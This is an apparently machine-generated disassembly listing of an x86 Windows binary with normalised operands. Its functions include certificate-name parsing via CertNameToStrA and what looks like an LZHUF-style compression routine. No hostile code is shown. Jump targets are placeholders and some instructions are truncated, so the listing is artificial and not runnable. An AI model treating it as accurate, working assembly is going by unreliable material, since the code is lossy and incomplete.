push [ eax + 0x20 ]
call sub_420ec7
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x3f4 ]
mov eax [ eax + 0xc ]
push [ eax + 0x2c ]
push [ eax + 0x28 ]
call sub_420ec7
mov edi [ CertNameToStrA@IAT ]
mov [ esi + 0xbc ] eax
push 0x3e8
lea eax [ ebp - 0x3f0 ]
push eax
mov eax [ ebp - 0x3f4 ]
mov ecx [ eax + 0xc ]
mov ebx 0x20000003
push ebx
add ecx 0x30
push ecx
push [ eax ]
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x3f0 ]
push eax
lea ecx [ esi + 0x9c ]
call sub_40409c
push 0x3e8
lea eax [ ebp - 0x3f0 ]
push eax
mov eax [ ebp - 0x3f4 ]
mov ecx [ eax + 0xc ]
push ebx
add ecx 0x18
push ecx
push [ eax ]
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x3f0 ]
push eax
lea ecx [ esi + 0x80 ]
call sub_40409c
sub_421265
push 0x5c
mov eax sub_43ab06
call sub_425dad
mov edi [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
mov [ edi + 0x4 ] 0x2
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
mov [ edi ] r--data
call sub_403dae
mov [ ebp - 0x4 ] 0x1
mov [ edi + 0x24 ] 0x1
mov [ edi + 0x25 ] 0x1
mov [ edi + 0x26 ] 0x0
test ebx ebx
je r-xdata
xor esi esi
inc esi
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x30 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
xor esi esi
push ecx
inc esi
mov ecx ebx
mov [ ebp - 0x14 ] esi
call [ eax + 0x44 ]
test al al
je r-xdata
mov eax edi
call sub_425e4c
retn 0x4
mov esi r--data
push esi
lea ecx [ ebp - 0x68 ]
mov [ edi + 0x26 ] 0x1
call sub_403dc1
push esi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_403dc1
mov esi r--data
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
call sub_403dc1
lea ecx [ ebp - 0x68 ]
push ecx
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0xd ] al
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x1
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0xd ] 0x1
jmp r-xdata
push esi
lea ecx [ ebp - 0x68 ]
mov [ edi + 0x24 ] 0x0
call sub_403dc1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x4c ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x2c ]
push 0xffffffff
xor esi esi
push esi
push eax
lea ecx [ edi + 0x8 ]
call sub_40400a
push esi
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
cmp [ edi + 0x1c ] esi
je r-xdata
mov [ ebp - 0x4 ] esi
test [ ebp - 0x14 ] 0x1
je r-xdata
mov [ edi + 0x25 ] 0x0
sub_4213f6
push ebp
sub esp 0x60
push 0x38
mov eax sub_43c998
call sub_425dad
mov [ ebp + 0x58 ] ecx
xor ebx ebx
mov [ ebp + 0x60 ] ebx
cmp [ ecx + 0x26 ] bl
jne r-xdata
mov esi 0x80
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x5c ] eax
mov [ ebp - 0x4 ] ebx
mov edi r--data
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x5c ] ebx
push edi
lea ecx [ ebp - 0x28 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp + 0x38 ]
mov [ ebp + 0x60 ] 0x1
call sub_403dc1
push ebx
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp + 0x5c ]
mov [ ebp + 0x60 ] 0x3
call sub_41ec78
mov [ ebp + 0x5c ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x64
leave
retn
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x1
je r-xdata
and [ ebp + 0x60 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
test [ ebp + 0x60 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp + 0x5c ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp + 0x1c ]
push edx
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x24 ] bl
jne r-xdata
and [ ebp + 0x60 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov eax [ ebp + 0x5c ]
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x54 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
xor esi esi
push edi
lea ecx [ ebp - 0x44 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x7
or [ ebp + 0x60 ] 0x4
push r--data
lea ecx [ ebp ]
call sub_403dc1
push 0x8
pop eax
mov [ ebp - 0x4 ] eax
or [ ebp + 0x60 ] eax
mov edi [ ebp + 0x5c ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp ]
push eax
push [ ebp + 0x54 ]
xor bl bl
call sub_41ed6b
mov esi eax
xor ebx ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x4
je r-xdata
and [ ebp + 0x60 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
test [ ebp + 0x60 ] 0x8
je r-xdata
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x25 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_40415f
mov edx [ esi ]
add eax 0x8
push eax
mov ecx esi
call [ edx + 0x20 ]
sub_4215b3
push 0x58
mov eax sub_43c8fd
call sub_425dad
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ ebx + 0x4 ] 0x20
and [ ebp - 0x4 ] 0x0
lea edi [ ebx + 0x8 ]
mov [ ebx ] r--data
call sub_404957
lea esi [ ebx + 0xb0 ]
call sub_403dae
lea esi [ ebx + 0xcc ]
call sub_403dae
mov edi [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0xe8 ] 0x0
cmp edi esi
je r-xdata
mov [ ebp + 0xf ] 0x1
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
push r--data
call sub_40563c
pop ecx
test al al
je r-xdata
test [ ebp - 0x10 ] 0x2
je r-xdata
and [ ebp - 0x10 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x64 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
mov eax [ edi ]
push ecx
mov ecx edi
mov [ ebp - 0x10 ] 0x1
call [ eax + 0x44 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x3
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x48 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x5
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] 0x3
call sub_403dc1
lea ecx [ ebp - 0x48 ]
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ edi ]
push ecx
mov ecx edi
mov [ ebp - 0x10 ] 0x7
call [ eax + 0x44 ]
mov [ ebp + 0xf ] 0x0
test al al
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_40415f
test [ ebp - 0x10 ] 0x4
je r-xdata
mov eax ebx
call sub_425e4c
retn 0x8
mov eax [ edi ]
mov ecx edi
call [ eax + 0x2c ]
push 0xffffffff
push esi
push eax
lea ecx [ ebx + 0xcc ]
call sub_40400a
push r--data
lea ecx [ ebp - 0x64 ]
call sub_403dc1
lea ecx [ ebp - 0x64 ]
push ecx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x40 ]
push 0xffffffff
push esi
push eax
lea ecx [ ebx + 0xb0 ]
mov [ ebp - 0x4 ] 0x8
call sub_40400a
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
push esi
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x3
call sub_40415f
push r--data
lea ecx [ ebp - 0x64 ]
call sub_403dc1
lea ecx [ ebp - 0x64 ]
push ecx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x9
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x40 ]
push eax
lea edi [ ebx + 0x8 ]
mov [ ebp - 0x4 ] 0xa
call sub_4145f0
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
push esi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_40415f
mov [ ebx + 0xe8 ] 0x1
sub_4217a3
push esi
push edi
mov edi ecx
push 0x0
push 0x1
lea ecx [ edi + 0xcc ]
mov [ edi ] r--data
call sub_40415f
push 0x0
push 0x1
lea ecx [ edi + 0xb0 ]
call sub_40415f
lea esi [ edi + 0x8 ]
call sub_4011ad
mov [ edi ] r--data
pop edi
pop esi
retn
sub_4217dc
push 0x78
mov eax sub_43c845
call sub_425dad
mov edi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ edi + 0xe8 ] bl
jne r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] 0x1
call sub_403dc1
push ebx
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x3
call sub_41ec78
mov esi eax
jmp r-xdata
call sub_425e4c
retn
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
cmp [ edi + 0x54 ] ebx
je r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
cmp [ edi + 0xc4 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
lea ecx [ edi + 0x94 ]
push ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
cmp [ edi + 0xe0 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
lea ecx [ edi + 0xb0 ]
push ecx
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x84 ]
call sub_40415f
mov eax esi
mov eax [ esi ]
add edi 0xcc
push edi
mov ecx esi
call [ eax + 0x20 ]
sub_421958
push ebp
mov ebp esp
sub esp 0x10
movsx edx [ ebp + 0x8 ]
movzx cx [ edx + eax + 0x8 ]
push ebx
push esi
mov esi 0x1001
add cx si
push edi
movzx esi cx
mov edi 0x1000
lea ecx [ eax + edx * 2 + 0x1048 ]
mov ebx edi
mov [ ecx ] bx
mov [ ebp - 0xc ] ecx
lea ecx [ eax + edx * 2 + 0x304a ]
mov [ ecx ] di
mov [ ebp - 0x10 ] ecx
xor ecx ecx
mov [ ebp - 0x8 ] 0x1
mov [ eax + 0x1046 ] cx
movzx ecx [ eax + ecx * 2 + 0x1048 ]
cmp cx di
je r-xdata
movzx ecx [ eax + ecx * 2 + 0x304a ]
cmp cx di
jne r-xdata
mov di [ ebp + 0x8 ]
movsx ecx si
mov [ eax + ecx * 2 + 0x1048 ] di
movzx esi cx
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov di [ ebp + 0x8 ]
movsx ecx si
mov [ eax + ecx * 2 + 0x304a ] di
jmp r-xdata
cmp cx 0x2
jle r-xdata
inc ecx
cmp cx 0x3c
mov [ ebp - 0x4 ] ecx
jl r-xdata
mov [ eax + edx * 2 + 0x524c ] si
cmp [ ebp - 0x8 ] 0x0
movsx ecx si
mov edi 0x1000
jl r-xdata
cmp cx [ eax + 0x1046 ]
jle r-xdata
movsx ecx cx
movsx edi si
add edi ecx
movzx bx [ edi + eax + 0x8 ]
lea edi [ edx + eax + 0x8 ]
movzx cx [ ecx + edi ]
sub cx bx
movzx ecx cx
mov [ ebp - 0x8 ] ecx
test cx cx
mov ecx [ ebp - 0x4 ]
jne r-xdata
jne r-xdata
mov edi [ ebp + 0x8 ]
sub edi esi
and edi 0xfff
dec edi
cmp cx 0x3c
mov [ eax + 0x1044 ] di
mov [ eax + 0x1046 ] cx
jge r-xdata
movsx edi si
mov ecx edx
sub ecx edi
lea edi [ eax + 0x1044 ]
movzx ebx [ edi ]
and ecx 0xfff
dec ecx
cmp ecx ebx
jae r-xdata
movsx ecx si
lea edi [ eax + ecx * 2 + 0x524c ]
mov bx [ edi ]
mov [ eax + edx * 2 + 0x524c ] bx
mov ebx [ ebp - 0xc ]
lea edx [ eax + ecx * 2 + 0x1048 ]
mov [ ebp - 0x8 ] edx
mov dx [ edx ]
mov [ ebx ] dx
mov ebx [ ebp - 0x10 ]
lea ecx [ eax + ecx * 2 + 0x304a ]
mov dx [ ecx ]
mov [ ebx ] dx
mov edx [ ebp - 0x8 ]
movsx edx [ edx ]
mov ebx [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0x524c ] bx
movsx ecx [ ecx ]
mov [ eax + ecx * 2 + 0x524c ] bx
movsx ecx [ edi ]
lea edx [ eax + ecx * 2 + 0x304a ]
cmp [ edx ] si
jne r-xdata
cmp cx cx
mov [ edi ] cx
jmp r-xdata
mov [ eax + ecx * 2 + 0x1048 ] bx
mov [ edx ] bx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax 0x1000
mov [ edi ] ax
jmp r-xdata
sub_421b1e
push ebp
mov ebp esp
sub esp 0xc
movsx ecx [ ebp + 0x8 ]
push esi
push edi
mov edi 0x1000
lea esi [ eax + ecx * 2 + 0x524c ]
mov edx edi
mov [ ebp - 0x4 ] esi
cmp [ esi ] dx
je r-xdata
pop edi
pop esi
leave
retn 0x4
lea edx [ eax + ecx * 2 + 0x304a ]
mov [ ebp - 0x8 ] edx
movzx edx [ edx ]
push ebx
mov ebx edi
cmp dx bx
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x1048 ]
mov [ ebp - 0xc ] ecx
movzx ecx [ ecx ]
cmp cx bx
jne r-xdata
movzx ecx [ eax + ecx * 2 + 0x1048 ]
jmp r-xdata
movzx ecx cx
movsx edx cx
lea esi [ eax + edx * 2 + 0x304a ]
cmp [ esi ] bx
je r-xdata
movzx ecx dx
jmp r-xdata
mov bx [ esi ]
movsx edx cx
mov [ eax + edx * 2 + 0x524c ] bx
movsx edx [ esi ]
mov bx [ ebp + 0x8 ]
lea edx [ eax + edx * 2 + 0x304a ]
cmp [ edx ] bx
pop ebx
jne r-xdata
mov ebx [ ebp - 0x8 ]
mov bx [ ebx ]
mov esi [ ebp - 0x4 ]
mov [ eax + edx * 2 + 0x304a ] bx
mov edx [ ebp - 0x8 ]
movsx edx [ edx ]
mov [ eax + edx * 2 + 0x524c ] cx
movzx ecx [ esi ]
movsx edx cx
lea esi [ eax + edx * 2 + 0x304a ]
mov edx edi
cmp [ esi ] dx
jne r-xdata
movsx edx [ esi ]
mov [ eax + edx * 2 + 0x1048 ] cx
mov [ edx ] cx
jmp r-xdata
movsx edx cx
movsx edi [ eax + edx * 2 + 0x524c ]
lea esi [ eax + edx * 2 + 0x1048 ]
mov bx [ esi ]
mov [ eax + edi * 2 + 0x304a ] bx
movsx edi [ esi ]
mov bx [ eax + edx * 2 + 0x524c ]
mov [ eax + edi * 2 + 0x524c ] bx
mov edi [ ebp - 0xc ]
mov bx [ edi ]
mov [ esi ] bx
movsx esi [ edi ]
mov [ eax + esi * 2 + 0x524c ] cx
mov edi 0x1000
mov [ esi ] di
sub_421c49
push esi
mov esi eax
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
lea eax [ esi + 0x8376 ]
movzx ecx [ eax ]
movzx edx cx
add ecx ecx
dec [ esi + 0x8378 ]
mov [ eax ] cx
movzx eax dx
shr eax 0xf
pop esi
retn
push edi
mov al [ esi + 0x8378 ]
movzx edi al
push 0x8
pop ecx
sub ecx edi
shl edx cl
add al 0x8
mov [ esi + 0x8378 ] al
or [ esi + 0x8376 ] dx
cmp al 0x8
jbe r-xdata
xor edx edx
call sub_4225ab
movzx edx ax
mov eax 0xffff
cmp dx ax
jne r-xdata
pop edi
sub_421cad
push esi
mov esi eax
cmp [ esi + 0x8378 ] 0x8
ja r-xdata
add [ esi + 0x8378 ] 0xf8
lea ecx [ esi + 0x8376 ]
movzx eax [ ecx ]
movzx edx ax
shl eax 0x8
mov [ ecx ] ax
movzx eax dx
shr eax 0x8
pop esi
retn
push edi
mov al [ esi + 0x8378 ]
movzx edi al
push 0x8
pop ecx
sub ecx edi
shl edx cl
add al 0x8
mov [ esi + 0x8378 ] al
or [ esi + 0x8376 ] dx
cmp al 0x8
jbe r-xdata
xor edx edx
call sub_4225ab
movzx edx ax
mov eax 0xffff
cmp dx ax
jne r-xdata
pop edi
sub_421d13
push edi
mov edi eax
mov al [ esi + 0x837c ]
mov cl al
add al [ esp + 0x8 ]
mov edx edi
shr dx cl
mov [ esi + 0x837c ] al
or [ esi + 0x837a ] dx
cmp al 0x8
jb r-xdata
pop edi
retn 0x4
movzx eax [ esi + 0x837b ]
push eax
mov eax esi
call sub_42262e
cmp eax 0xffffffff
je r-xdata
add [ esi + 0x837c ] 0xf8
cmp [ esi + 0x837c ] 0x8
jb r-xdata
shl [ esi + 0x837a ] 0x8
inc [ esi + 0x4 ]
movzx eax [ esi + 0x837a ]
push eax
mov eax esi
call sub_42262e
cmp eax 0xffffffff
je r-xdata
add [ esi + 0x837c ] 0xf8
movzx eax [ esi + 0x837c ]
mov ecx [ esp + 0x8 ]
add [ esi + 0x4 ] 0x2
sub ecx eax
shl edi cl
mov [ esi + 0x837a ] di
jmp r-xdata
sub_421da2
push ebx
push esi
push edi
xor edx edx
lea ecx [ eax + 0x7e90 ]
mov esi 0x13a
xor edi edi
inc edi
mov [ ecx - 0xc42 ] di
lea edi [ edx + 0x273 ]
mov [ ecx - 0x274 ] dx
mov [ ecx ] di
inc edx
inc ecx
mov edi esi
inc ecx
cmp dx di
jl r-xdata
xor edi edi
lea edx [ eax + 0x8104 ]
movsx ecx di
mov bx [ eax + ecx * 2 + 0x7250 ]
add bx [ eax + ecx * 2 + 0x724e ]
mov [ edx ] di
inc edi
mov [ edx - 0xc42 ] bx
inc edi
mov [ eax + ecx * 2 + 0x7738 ] si
mov [ eax + ecx * 2 + 0x7736 ] si
inc esi
inc edx
mov ecx 0x272
inc edx
cmp si cx
jle r-xdata
mov ecx 0xffff
pop edi
mov [ eax + 0x7734 ] cx
xor ecx ecx
pop esi
mov [ eax + 0x7c1a ] cx
pop ebx
retn
sub_421e33
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx 0x273
push edi
lea ecx [ esi + 0x7e90 ]
mov [ ebp - 0x8 ] ebx
inc ecx
inc ecx
dec [ ebp - 0x8 ]
jne r-xdata
movzx eax [ ecx - 0xc42 ]
movsx edi [ ebp - 0x4 ]
inc eax
cdq
sub eax edx
sar eax 0x1
inc [ ebp - 0x4 ]
mov [ esi + edi * 2 + 0x724e ] ax
mov ax [ ecx ]
mov [ esi + edi * 2 + 0x7e90 ] ax
mov eax ebx
cmp [ ecx ] ax
jl r-xdata
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x13a
cmp bx [ esi + ecx * 2 + 0x724e ]
jb r-xdata
dec eax
movsx ecx ax
inc eax
sub edx eax
add edx edx
movzx ecx dx
movsx edi ax
push ecx
lea eax [ esi + edi * 2 + 0x724e ]
push eax
lea eax [ esi + edi * 2 + 0x7250 ]
push eax
mov [ ebp - 0xc ] ecx
call sub_4250d0
push [ ebp - 0xc ]
mov [ esi + edi * 2 + 0x724e ] bx
lea ebx [ esi + edi * 2 + 0x7e90 ]
lea eax [ esi + edi * 2 + 0x7e92 ]
push ebx
push eax
call sub_4250d0
mov ax [ ebp - 0x8 ]
add [ ebp - 0x8 ] 0x2
add esp 0x18
inc [ ebp - 0x4 ]
mov [ ebx ] ax
mov eax 0x273
cmp [ ebp - 0x4 ] ax
jl r-xdata
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x1 ]
movsx ecx cx
movsx edx ax
mov ax [ esi + ecx * 2 + 0x724e ]
add ax [ esi + edx * 2 + 0x724e ]
mov edx [ ebp - 0x4 ]
movsx ecx dx
mov [ esi + ecx * 2 + 0x724e ] ax
lea ecx [ edx - 0x1 ]
movzx ebx ax
movzx eax cx
movsx ecx cx
jmp r-xdata
lea ecx [ esi + 0x7e90 ]
xor eax eax
mov edi ecx
inc eax
inc edi
inc edi
cmp ax dx
jl r-xdata
mov [ esi + ecx * 2 + 0x7738 ] ax
movzx ecx [ edi ]
mov edx 0x273
mov ebx edx
cmp cx bx
movsx ecx cx
mov [ esi + ecx * 2 + 0x7736 ] ax
jge r-xdata
pop edi
pop ebx
leave
retn
sub_421f6f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov eax 0x8000
push edi
cmp [ esi + 0x7732 ] ax
jne r-xdata
movsx eax [ ebp + 0x8 ]
movzx ecx [ esi + eax * 2 + 0x7c1c ]
mov [ ebp + 0x8 ] ecx
call sub_421e33
movsx eax cx
movzx ecx [ esi + eax * 2 + 0x7736 ]
mov [ ebp + 0x8 ] ecx
test cx cx
jne r-xdata
inc edx
movsx ecx dx
cmp di [ esi + ecx * 2 + 0x724e ]
ja r-xdata
movsx eax cx
lea eax [ esi + eax * 2 + 0x724e ]
inc [ eax ]
movzx edx [ eax ]
movzx edi dx
lea edx [ ecx + 0x1 ]
movzx edx dx
movsx ebx dx
mov [ ebp - 0x4 ] edi
cmp di [ esi + ebx * 2 + 0x724e ]
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
dec edx
movsx edi dx
lea ecx [ esi + edi * 2 + 0x724e ]
mov bx [ ecx ]
mov [ eax ] bx
mov ax [ ebp - 0x4 ]
mov [ ecx ] ax
movsx eax [ ebp + 0x8 ]
lea eax [ esi + eax * 2 + 0x7e90 ]
mov [ ebp - 0x4 ] eax
movzx eax [ eax ]
movsx ecx ax
mov ebx 0x273
cmp ax bx
mov [ esi + ecx * 2 + 0x7736 ] dx
jge r-xdata
lea edi [ esi + edi * 2 + 0x7e90 ]
movzx ecx [ edi ]
cmp cx bx
mov [ edi ] ax
mov edi [ ebp + 0x8 ]
movsx eax cx
mov [ esi + eax * 2 + 0x7736 ] di
jge r-xdata
mov [ esi + ecx * 2 + 0x7738 ] dx
mov eax [ ebp - 0x4 ]
mov [ eax ] cx
movzx ecx dx
mov [ esi + eax * 2 + 0x7738 ] di
sub_42206a
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
movzx eax [ ebp + 0x8 ]
movzx eax [ esi + eax * 2 + 0x7c1c ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cwde
movzx eax [ esi + eax * 2 + 0x7736 ]
mov ecx 0x272
inc edi
cmp ax cx
jne r-xdata
add [ ebp - 0x4 ] 0x8000
shr [ ebp - 0x4 ] 0x1
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
push edi
call sub_421d13
mov ax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov [ esi + 0x837e ] ax
mov eax esi
mov [ esi + 0x8380 ] di
call sub_421f6f
pop edi
pop esi
leave
retn 0x4
sub_4220d1
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi eax
movzx eax [ esi ]
push edi
push eax
xor edi edi
mov eax esi
mov [ esi + 0x4 ] edi
call sub_42262e
movzx eax [ esi + 0x1 ]
push eax
mov eax esi
call sub_42262e
movzx eax [ esi + 0x2 ]
push eax
mov eax esi
call sub_42262e
movzx eax [ esi + 0x3 ]
push eax
mov eax esi
call sub_42262e
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
leave
retn
push ebx
mov eax esi
mov [ esi ] edi
call sub_421da2
mov edx 0x1000
mov eax edx
movzx ebx ax
mov eax ebx
shl ebx 0x10
or eax ebx
lea edi [ esi + 0x504c ]
mov ecx 0x80
[ edi ]
mov eax edx
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
lea edi [ esi + 0x524c ]
mov ecx 0x800
[ edi ]
mov edi 0xfc4
push edi
lea eax [ esi + 0x8 ]
push 0x20
xor ebx ebx
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] edi
call sub_42b5a0
add esp 0xc
mov [ ebp - 0x8 ] ebx
movsx eax bx
mov [ esi ] eax
mov [ ebp - 0xc ] 0xfc3
movsx ecx bx
inc ebx
cmp bx 0x3c
mov [ ecx + esi + 0xfcc ] al
mov [ ebp - 0x8 ] ebx
jl r-xdata
push [ ebp - 0xc ]
mov eax esi
call sub_421958
dec [ ebp - 0xc ]
mov eax 0xf88
cmp [ ebp - 0xc ] ax
jge r-xdata
push edi
mov eax esi
call sub_421958
mov edi 0xfff
jmp r-xdata
call sub_4225ab
movzx eax ax
cmp ax 0xffff
je r-xdata
cmp [ esi + 0x1046 ] bx
jle r-xdata
movzx eax [ esi + 0x1046 ]
cmp ax 0x2
jg r-xdata
mov [ esi + 0x1046 ] bx
add eax 0xfd
push eax
mov eax esi
call sub_42206a
movzx ebx [ esi + 0x1044 ]
mov ax bx
shr ax 0x6
movzx eax ax
movzx ecx ax
movzx ax [ ecx + rw-data ]
movzx cx [ ecx + rw-data ]
movzx ecx cx
shl ax 0x8
push ecx
call sub_421d13
mov eax ebx
shl eax 0xa
push 0x6
call sub_421d13
xor eax eax
inc eax
mov [ esi + 0x1046 ] ax
movsx eax [ ebp - 0x4 ]
movzx ax [ eax + esi + 0x8 ]
movzx eax ax
push eax
mov eax esi
call sub_42206a
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
call sub_4225ab
movzx eax ax
mov [ ebp - 0x14 ] eax
cmp ax 0xffff
je r-xdata
movzx ebx [ esi + 0x1046 ]
and [ ebp - 0xc ] 0x0
xor eax eax
cmp ax bx
jge r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ esi + 0x837c ] 0x0
pop ebx
je r-xdata
cmp [ ebp - 0xc ] bx
jge r-xdata
push [ ebp - 0x10 ]
mov eax esi
call sub_421b1e
mov ecx [ ebp - 0x10 ]
mov dl [ ebp - 0x14 ]
movsx eax cx
add eax esi
cmp cx 0x3b
mov [ eax + 0x8 ] dl
jge r-xdata
movzx eax [ esi + 0x837b ]
push eax
mov eax esi
call sub_42262e
cmp eax 0xffffffff
je r-xdata
sub ebx [ ebp - 0xc ]
movzx eax bx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
inc ecx
and ecx edi
inc eax
and eax edi
mov [ ebp - 0x4 ] eax
push eax
mov eax esi
mov [ ebp - 0x10 ] ecx
call sub_421958
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] bx
jl r-xdata
mov [ eax + 0x1008 ] dl
